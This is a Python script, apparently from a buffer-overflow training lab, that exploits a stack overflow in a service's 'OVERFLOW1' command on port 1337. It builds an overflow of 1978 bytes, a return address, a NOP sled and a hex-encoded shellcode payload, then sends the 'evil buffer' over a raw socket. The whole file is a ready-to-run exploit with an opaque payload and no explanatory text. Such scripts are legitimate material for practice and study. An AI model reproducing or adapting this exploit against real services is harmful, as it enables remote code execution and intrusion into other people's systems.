#!/usr/bin/python3

import socket

ip = "10.10.38.149"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xda\xc7\xb8\xfa\x57\xde\x94\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x46\x17\x83\xc6\x04\x03\xbc\x44\x3c\x61\xbc\x83\x42"
"\x8a\x3c\x54\x23\x02\xd9\x65\x63\x70\xaa\xd6\x53\xf2\xfe\xda"
"\x18\x56\xea\x69\x6c\x7f\x1d\xd9\xdb\x59\x10\xda\x70\x99\x33"
"\x58\x8b\xce\x93\x61\x44\x03\xd2\xa6\xb9\xee\x86\x7f\xb5\x5d"
"\x36\x0b\x83\x5d\xbd\x47\x05\xe6\x22\x1f\x24\xc7\xf5\x2b\x7f"
"\xc7\xf4\xf8\x0b\x4e\xee\x1d\x31\x18\x85\xd6\xcd\x9b\x4f\x27"
"\x2d\x37\xae\x87\xdc\x49\xf7\x20\x3f\x3c\x01\x53\xc2\x47\xd6"
"\x29\x18\xcd\xcc\x8a\xeb\x75\x28\x2a\x3f\xe3\xbb\x20\xf4\x67"
"\xe3\x24\x0b\xab\x98\x51\x80\x4a\x4e\xd0\xd2\x68\x4a\xb8\x81"
"\x11\xcb\x64\x67\x2d\x0b\xc7\xd8\x8b\x40\xea\x0d\xa6\x0b\x63"
"\xe1\x8b\xb3\x73\x6d\x9b\xc0\x41\x32\x37\x4e\xea\xbb\x91\x89"
"\x0d\x96\x66\x05\xf0\x19\x97\x0c\x37\x4d\xc7\x26\x9e\xee\x8c"
"\xb6\x1f\x3b\x02\xe6\x8f\x94\xe3\x56\x70\x45\x8c\xbc\x7f\xba"
"\xac\xbf\x55\xd3\x47\x3a\x3e\xd6\x91\x59\x2b\x8e\x9f\x61\x42"
"\x13\x29\x87\x0e\xbb\x7f\x10\xa7\x22\xda\xea\x56\xaa\xf0\x97"
"\x59\x20\xf7\x68\x17\xc1\x72\x7a\xc0\x21\xc9\x20\x47\x3d\xe7"
"\x4c\x0b\xac\x6c\x8c\x42\xcd\x3a\xdb\x03\x23\x33\x89\xb9\x1a"
"\xed\xaf\x43\xfa\xd6\x6b\x98\x3f\xd8\x72\x6d\x7b\xfe\x64\xab"
"\x84\xba\xd0\x63\xd3\x14\x8e\xc5\x8d\xd6\x78\x9c\x62\xb1\xec"
"\x59\x49\x02\x6a\x66\x84\xf4\x92\xd7\x71\x41\xad\xd8\x15\x45"
"\xd6\x04\x86\xaa\x0d\x8d\xa6\x48\x87\xf8\x4e\xd5\x42\x41\x13"
"\xe6\xb9\x86\x2a\x65\x4b\x77\xc9\x75\x3e\x72\x95\x31\xd3\x0e"
"\x86\xd7\xd3\xbd\xa7\xfd")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
